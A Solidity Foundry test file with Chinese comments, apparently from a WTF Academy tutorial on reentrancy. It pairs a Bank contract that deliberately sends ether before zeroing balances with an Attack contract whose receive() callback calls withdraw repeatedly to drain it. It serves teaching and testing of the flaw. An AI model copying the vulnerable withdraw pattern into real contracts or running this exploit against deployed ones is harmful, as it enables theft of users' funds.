// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract safe_01 is Test{
 // safe 01 重入攻击   https://wtf.academy/solidity-application/S01_ReentrancyAttack/
 // forge test -vv --match-test  testsafe_01
    function testsafe_01()  public{
        console.log("wtf safe 01 reentrancy attack");    
        Bank bank = new Bank();
        // 银行合约存款前余额
        console.log("bank balance before deposits:" , bank.getBalance() / 1 ether);
        // 向银行合约存入10 ether
        bank.deposit{value: 10 ether}();
        // 银行合约存款后余额
        console.log("bank balance after deposits:" , bank.getBalance() / 1 ether);
        Attack attack = new Attack(bank); 
        //  攻击前攻击合约余额
        console.log("attack balance before attack:" , attack.getBalance() / 1 ether);
        //  攻击者开始攻击 
        attack.attack{value: 1 ether}();
        //  攻击后攻击合约余额
        console.log("attack balance after attack:" , attack.getBalance() / 1 ether);
    }
    

     
}

contract Attack {
    Bank public bank; // Bank合约地址

    // 初始化Bank合约地址
    constructor(Bank _bank) {
        bank = _bank;
    }
    
    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
    receive() external payable {
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}



contract Bank {
    mapping (address => uint256) public balanceOf;    // 余额mapping

    // 存入ether，并更新余额
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    // 提取msg.sender的全部ether
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender]; // 获取余额
        require(balance > 0, "Insufficient balance");
        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
        // 更新余额
        balanceOf[msg.sender] = 0;
    }

    // 获取银行合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

}